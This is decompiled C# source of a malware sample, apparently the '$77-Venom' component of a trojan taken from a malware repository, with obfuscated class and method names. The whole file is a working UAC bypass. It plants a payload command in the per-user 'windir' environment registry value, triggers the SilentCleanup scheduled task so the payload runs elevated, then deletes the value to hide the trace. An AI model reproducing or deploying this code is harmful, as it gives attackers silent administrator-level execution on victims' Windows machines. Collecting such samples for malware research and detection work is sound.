// Decompiled with JetBrains decompiler
// Type: 倈਌查﯑ힴ㍆흸碤쥄ꢱ셿ϵ꛾鐎꫌雷땕᫱맲
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Threading;

public class \uF42C倈\u0A0C查\uFBD1ힴ\u3346흸碤쥄ꢱ셿ϵ\uA6FE鐎\uAACC雷땕\u1AF1맲
{
  public static void \uFFFD難ᄌ川郕\uED64䆊镙\u3321㥡\u1943⳰띃患櫵剥\uFFFD雜쵠螵(string[] args)
  {
    Console.WriteLine("[+] Starting Bypass UAC.");
    string str = "";
    if (args.Length != 0)
    {
      str = args[0];
      Console.WriteLine("[+] Payload to be Executed " + str);
    }
    else
      Console.WriteLine("[+] No Payload specified. Executing cmd.exe.");
    try
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Environment");
      subKey.SetValue("windir", (object) ("cmd.exe /k " + str + " &  exit  & "), RegistryValueKind.String);
      subKey.Close();
      Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
    }
    catch
    {
      Console.WriteLine("[-] Unable to Create the Enviroment Variabled %windir%.");
      Console.WriteLine("[-] Exit.");
    }
    Console.WriteLine("[+] Waiting 5 seconds before execution.");
    Thread.Sleep(5000);
    try
    {
      Process.Start(new ProcessStartInfo()
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        FileName = "schtasks.exe",
        Arguments = "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
      });
      Console.WriteLine("[+] UAC Bypass Application Executed.");
    }
    catch
    {
      Console.WriteLine("[-] Unable to Execute the Application schtasks.exe to perform the bypass.");
    }
    \uF42C倈\u0A0C查\uFBD1ힴ\u3346흸碤쥄ꢱ셿ϵ\uA6FE鐎\uAACC雷땕\u1AF1맲.罤몣㦮垅䨯跩\uFFFD嬮좟鶪ꆮ둌詓\uE6E7ꫪ\uF49F菱\uE779艇脁();
    Console.WriteLine("[-] Exit.");
  }

  private static void 罤몣㦮垅䨯跩\uFFFD嬮좟鶪ꆮ둌詓\uE6E7ꫪ\uF49F菱\uE779艇脁()
  {
    Console.WriteLine("[+] Registry Cleaning will start in 5 seconds.");
    Thread.Sleep(5000);
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Environment", true);
      if (registryKey != null)
      {
        try
        {
          registryKey.DeleteValue("windir");
          registryKey.Close();
        }
        catch (Exception ex)
        {
          Console.WriteLine("[-] Unable to Delete the Registry key (Environment). Error " + ex.Message);
        }
      }
      Console.WriteLine("[+] Registry Cleaned.");
    }
    catch
    {
      Console.WriteLine("[-] Unable to Clean the Registry.");
    }
  }
}
